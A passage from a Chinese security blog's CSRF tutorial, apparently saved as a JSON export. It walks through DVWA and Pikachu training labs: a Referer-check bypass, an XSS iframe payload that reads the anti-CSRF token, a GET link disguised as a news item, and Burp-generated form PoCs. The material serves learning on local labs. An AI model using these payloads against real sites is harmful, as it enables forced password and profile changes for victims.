punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>添加了Refeerer头检验，这个的话是要求来自同一个域，其实也就是要求访问的必须是本地的，但<code>Referer</code>请求头是可以伪造的，具体过程如下<br>简单输入抓包<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152238.png\" alt=\"在这里插入图片描述\"></p>\n<p>这里的话可以看见本地的Referer是127.0.0.1，和Host的是一致的，但正常的情况下是不一致的，Host一般是受害者的，而Referer来源于攻击者</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>比如Host的地址为192.134.164.132，这个时候攻击者的ip肯定是与Host的不同的，假设是186.123.134.265，这个时候如果请求的话，Referer是<a href=\"http://186.123.134.265，就会因为Referer中不包含192.134.164.132\">http://186.123.134.265，就会因为Referer中不包含192.134.164.132</a> 而无法修改密码，但如果我们文件名包含这个Host地址，那Referer就会变成<a href=\"http://186.123.134.265/192.134.164.132.html，此时就包含了Host地址，就可以成功修改密码，实现CSRF\">http://186.123.134.265/192.134.164.132.html，此时就包含了Host地址，就可以成功修改密码，实现CSRF</a></p></blockquote>\n<p>说了这么多，我们现在来自己进行测试一下，利用burpsuite构造出POC<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152643.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152683.png\" alt=\"在这里插入图片描述\"><br>构造一个html文件，然后将内容复制进去<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152735.png\" alt=\"在这里插入图片描述\"><br>点击访问<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152723.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152822.png\" alt=\"在这里插入图片描述\"><br>成功修改密码，实现CSRF</p>\n<h3 id=\"High\"><a href=\"#High\" class=\"headerlink\" title=\"High\"></a>High</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Change'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// Check Anti-CSRF token</span>\n    <span class=\"token function\">checkToken</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'user_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'session_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'index.php'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Get input</span>\n    <span class=\"token variable\">$pass_new</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password_new'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$pass_conf</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password_conf'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Do the passwords match?</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$pass_conf</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// They do!</span>\n        <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass_new</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_new</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Update the database</span>\n        <span class=\"token variable\">$insert</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"UPDATE `users` SET password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass_new</span></span>' WHERE user = '\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">dvwaCurrentUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"';\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$insert</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Feedback for the user</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>Password Changed.&lt;/pre>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Issue with passwords matching</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>Passwords did not match.&lt;/pre>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// Generate Anti-CSRF token</span>\n<span class=\"token function\">generateSessionToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以发现多了这个<code>generateSessionToken()</code>函数，这个是用来生成token的，具体介绍如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Anti<span class=\"token operator\">-</span><span class=\"token constant\">CSRF</span> token机制，用户每次访问该页面时，服务器都会返回一个随机的token（<span class=\"token function\">generateSessionToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>），向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token<span class=\"token punctuation\">,</span>只有token正确，才会处理客户端的请求。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里的话我们有两种方式</p>\n<h4 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h4><p>借助XSS来获取token，这个网页中有一个high的xss漏洞，如果我们通过xss得到token，此时就可以按照之前的方法来进行CSRF了，打开存储型XSS，发现这里限制了输入长度，F12修改一下即可<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152923.png\" alt=\"在这里插入图片描述\"><br>测试后发现过滤了script，这里的话我们可用其他标签获取token</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>iframe src<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"../csrf/\"</span> onload<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span>document<span class=\"token operator\">.</span><span class=\"token function\">getElementsByName</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'user_token'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>输入后提交，刷新界面就会出现此时的token<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152164.png\" alt=\"在这里插入图片描述\"><br>这时候按照之前的方法进行CSRF即可，在提交的时候额外带上一个CSRF就可以了</p>\n<h4 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h4><p>正常情况下抓包后发包，由于token更新，这个已经失效，访问会变成302<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152235.png\" alt=\"在这里插入图片描述\"><br>这时候利用burpsuite中的CSRF插件来进行攻击(这个插件可以自动更新token)。在拓展中找到<code>CSRF Token Tracker</code><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152294.png\" alt=\"在这里插入图片描述\"><br>安装一下，打开它添加Host和对应的token名<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152322.png\" alt=\"在这里插入图片描述\"><br>此时再重放<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152314.png\" alt=\"在这里插入图片描述\"><br>成功修改密码，实现CSRF</p>\n<h2 id=\"pikachu\"><a href=\"#pikachu\" class=\"headerlink\" title=\"pikachu\"></a>pikachu</h2><h3 id=\"GET\"><a href=\"#GET\" class=\"headerlink\" title=\"GET\"></a>GET</h3><p>登录后查看一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152432.png\" alt=\"在这里插入图片描述\"><br>看一下可以修改的信息<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152571.png\" alt=\"在这里插入图片描述\"><br>发现可以修改的name值，这个时候我们就可以自己构造语句来进行修改信息，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=静一静&amp;phonenum=全体目光向我看齐&amp;add=我宣布个事&amp;email=你是个纱布&amp;submit=submit</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>简单修改一下的话就变成了</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://127.0.0.1:8080/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=静一静&amp;phonenum=全体目光向我看齐&amp;add=我宣布个事&amp;email=你是个纱布&amp;submit=submit\"</span><span class=\"token operator\">></span>虎哥的东北往事，点击了解<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>在能解析HTML的界面上就会变成这样<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152707.png\" alt=\"在这里插入图片描述\"><br>当把这个放在公网上，受害者点击后就会自动修改个人信息，如下所示<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152739.png\" alt=\"在这里插入图片描述\"><br>此时就达到了CSRF的目的</p>\n<h3 id=\"POST\"><a href=\"#POST\" class=\"headerlink\" title=\"POST\"></a>POST</h3><p>对于POST提交的话，这个我们就需要构造html表单了，这个时候就可以借助burpsuite来实现<br>具体步骤如下<br>登录后在修改信息处点submit时抓包<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152752.png\" alt=\"在这里插入图片描述\"><br>右键发送到重放模块<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152783.png\" alt=\"在这里插入图片描述\"><br>修改信息<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152863.png\" alt=\"在这里插入图片描述\"><br>构造poc<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152087.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152162.png\" alt=\"在这里插入图片描述\"><br>放至到一个html文件中，当受害者访问时，出现界面<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152194.png\" alt=\"在这里插入图片描述\"><br>点击后就会发现信息就会被修改<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152258.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"token\"><a href=\"#token\" class=\"headerlink\" title=\"token\"></a>token</h3><p>这个可以利用burpsuite的CSRF获取token插件来进行攻击，具体步骤如下<br>在拓展中找到<code>CSRF Token Tracker</code>(作用是自动识别并更新token)<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152294.png\" alt=\"在这里插入图片描述\">安装后打开，添加Host和name<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152294.png\" alt=\"在这里插入图片描述\"><br>然后抓包<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152439.png\" alt=\"在这里插入图片描述\"><br>发送到重放模块，修改信息<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152569.png\" alt=\"在这里插入图片描述\"><br>此时再查看界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152663.png\" alt=\"在这里插入图片描述\"></p>\n<p>成功修改了信息，实现CSRF</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>CSRF的话目前已经不会单独出现了，想要利用的话经常要结合XSS这种，这里主要是学习一下大致思路，待日后遇到具体的CSRF漏洞时，再进行记录。若文章有不当之处，还请各位大师傅多多指教。</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://tttang.com/archive/1246/#toc_0x03-csrf\">https://tttang.com/archive/1246/#toc_0x03-csrf</a><br><a href=\"https://tech.meituan.com/2018/10/11/fe-security-csrf.html\">https://tech.meituan.com/2018/10/11/fe-security-csrf.html</a><br><a href=\"https://xz.aliyun.com/t/7297\">https://xz.aliyun.com/t/7297</a><br><a href=\"https://xz.aliyun.com/t/8186\">https://xz.aliyun.com/t/8186</a><br><a href=\"https://en.wikipedia.org/wiki/Cross-site_request_forgery\">https://en.wikipedia.org/wiki/Cross-site_request_forgery</a></p>\n","feature":true,"text":"前言CSRF只有简单了解，进行二次学习后总结如下，希望对正在学习CSRF的师傅有所帮助(本人只是小白，可能文章会出现问题，还请各位大师傅多多指点) 漏洞相关信息漏洞成因受害者在未退出重要网站的情况下出于好奇心或者其他心理访问了某个恶意链接，而这个恶意链接指向某个网站，比如受害者刚...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"CSRF","slug":"CSRF","count":1,"path":"api/tags/CSRF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">漏洞相关信息</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0\"><span class=\"toc-text\">漏洞成因</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%B9%89\"><span class=\"toc-text\">漏洞定义</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3\"><span class=\"toc-text\">漏洞危害</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">常见类型</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GET%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">GET上传</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#POST%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">POST上传</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#token%E9%AA%8C%E8%AF%81\"><span class=\"toc-text\">token验证</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">攻击思路</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E7%94%A8%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">常用标签</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%9F%AD%E9%93%BE%E6%8E%A5%E4%BC%AA%E8%A3%85\"><span class=\"toc-text\">短链接伪装</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CSRF%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98\"><span class=\"toc-text\">CSRF漏洞挖掘</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#xhcms\"><span class=\"toc-text\">xhcms</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#beescms\"><span class=\"toc-text\">beescms</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">靶场实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#DVWA\"><span class=\"toc-text\">DVWA</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#low\"><span class=\"toc-text\">low</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#medium\"><span class=\"toc-text\">medium</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#High\"><span class=\"toc-text\">High</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">方法一</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">方法二</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#pikachu\"><span class=\"toc-text\">pikachu</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#GET\"><span class=\"toc-text\">GET</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#POST\"><span class=\"toc-text\">POST</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#token\"><span class=\"toc-text\">token</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">总结</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><span class=\"toc-text\">参考文献</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Flask SSTi从零到入门","uid":"2fc52d0d731cc7ed8b93f6d476d9f632","slug":"FLaskSSTI从零到入门","date":"2022-08-08T13:20:20.000Z","updated":"2023-03-14T07:27:50.000Z","comments":true,"path":"api/articles/FLaskSSTI从零到入门.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141527260.png","text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1698/ 文章由于hexo的md文件不接受具有{ {符号的，所以我这里不再放原文，想了解这篇文章的还请移步到跳跳糖社区 ","link":"","photos":[],"count_time":{"symbolsCount":100,"symbolsTime":"1 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"SSTI","slug":"SSTI","count":1,"path":"api/tags/SSTI.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"从多个基础CMS入坑代码审计","uid":"18629f2c244b07dcae82afe166d98af9","slug":"从多个基础CMS入坑代码审计","date":"2022-07-20T17:41:30.000Z","updated":"2024-02-14T07:30:38.000Z","comments":true,"path":"api/articles/从多个基础CMS入坑代码审计.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141758128.png","text":"代码审计概念什么是代码审计？ 代码审计是在一个编程中对源代码旨在发现错误、安全漏洞或违反编程约定的项目。说人话就是找它这些代码中可能存在问题的地方，然后看它是否真的存在漏洞。(博主小白，可能存在问题，请见谅) 分类代码审计的话大致分为三种，白盒、黑盒和灰盒 白盒测试较为官方的定义...","link":"","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"15 